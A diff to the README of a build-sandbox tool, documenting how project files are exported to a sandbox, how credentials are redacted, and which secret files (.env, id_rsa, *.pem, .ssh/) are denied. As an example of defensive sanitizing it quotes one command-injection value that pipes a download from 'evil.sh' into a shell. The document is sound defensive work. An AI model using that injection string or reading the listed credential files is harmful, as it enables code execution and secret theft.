@@ -259,6 +259,7 @@ observed for the image that actually ran (`image_digest_observed`).
 ```bash
 $BIN/hodei-mh profile-run --profile rust --project /path/to/project --cpu 1 --memory 1Gi
 $BIN/hodei-mh profile-run --profile jvm  --project /path/to/project --cpu 1 --memory 1Gi
+$BIN/hodei-mh profile-run --profile rust --project /path/to/project --export-untracked
 ```
 
 Behavior:
@@ -288,11 +289,42 @@ Behavior:
 - The project directory name is sanitized (`[A-Za-z0-9._-]`) and every path
   is shell-quoted: a directory named `x; curl evil.sh | sh` is inert data.
 - Build commands carry no credentials; the leak detector runs over the
-  EXACT strings that were executed, and the build output is redacted before
-  it reaches the record.
+  EXACT strings that were executed (never over the redacted record, or it
+  would be blinded by the redaction it has to notice), and the build output
+  is REDACTED BEFORE it is truncated: a build that printed a credential does
+  not keep it in the tail that is persisted.
 - The record includes the sandbox id, the request tag, the cleanup result,
   the observed image digest, the exact commands and their outcomes (this is
   the artifact you archive per build).
+
+### What leaves the host
+
+The project is NOT copied as a tree. The export is an explicit list of
+files, decided before the sandbox exists:
+
+- The rules deny the git metadata, the build caches (`target/`,
+  `node_modules/`, `__pycache__/`, `.venv/`, `.gradle/`), the whole `.env`
+  family (`.env`, `.env.local`, `.env.production`...), the key and
+  certificate files (`*.pem`, `*.key`, `*.p12`, `id_rsa`, `id_ed25519`),
+  the `secrets/`, `credentials/` and `.ssh/` directories and the harness
+  management state (`backlog/`, `.claude/`). A denied path is denied EVEN
+  WHEN IT IS VERSIONED: the gitignore is not a secret detector, so a
+  committed `.env` is still a committed secret.
+- The policy decides what leaves besides the versioned content. By default
+  only the files the source of truth vouches for travel: in a git
+  working tree, the tracked files that do not carry a change. A modified
+  file and an untracked file are UNVERSIONED CHANGES and they travel only
+  with `--export-untracked`. A directory that is not a git working tree has
+  no index and no changes, so its whole tree travels (`source:
+  "tree_walk"` in the report).
+- The record carries `project_export` — the policy, the source, the files
+  that travelled and the files that were denied with the rule that denied
+  them. The same report is written to the candidate.
+- A symbolic link travels AS a link: the content it points at is never
+  read, so a link to a secret outside the project ships nothing.
+- The packed bytes live in a private directory (`0700`) with a
+  unpredictable name, and the archive itself is created with `0600`. Both
+  are removed as soon as the run is over.
 
 ## Global environment budget
 
